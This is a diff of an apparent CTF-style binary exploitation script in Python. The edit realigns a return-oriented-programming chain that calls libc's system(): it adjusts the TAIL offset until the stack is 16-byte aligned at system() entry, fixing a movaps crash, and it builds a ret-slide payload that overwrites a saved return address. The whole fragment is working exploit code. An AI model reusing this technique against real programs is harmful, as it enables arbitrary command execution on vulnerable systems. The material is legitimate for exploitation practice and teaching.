@@ -209,10 +209,16 @@ def main():
     system  = libc.sym["system"]
 
     SLIDE_START = OFF - 0x10      # data offset that maps to saved_rip
-    TAIL        = 0xb0           # where the real chain (pop rdi; system) begins
-    STR_OFF     = TAIL + 0x18
     data_addr   = stack_target + 0x10
-    cmd_addr    = data_addr + STR_OFF
+    # After the slide, system() is entered with rsp == saved_rip + TAIL. It must
+    # be 16-byte aligned or the movaps in do_system() segfaults (the "reached the
+    # read but no output" symptom). Pick TAIL so (saved_rip + TAIL) % 16 == 0.
+    TAIL = 0xb0
+    while (saved_rip + TAIL) % 16 != 0:
+        TAIL += 8
+    STR_OFF   = TAIL + 0x18
+    cmd_addr  = data_addr + STR_OFF
+    log.info(f"TAIL={hex(TAIL)}  system entry rsp={hex((saved_rip + TAIL) & 0xf)} (want 0)")
 
     data = bytearray()
     data += p64(ret) * (0xe8 // 8)          # baseline ret-slide everywhere
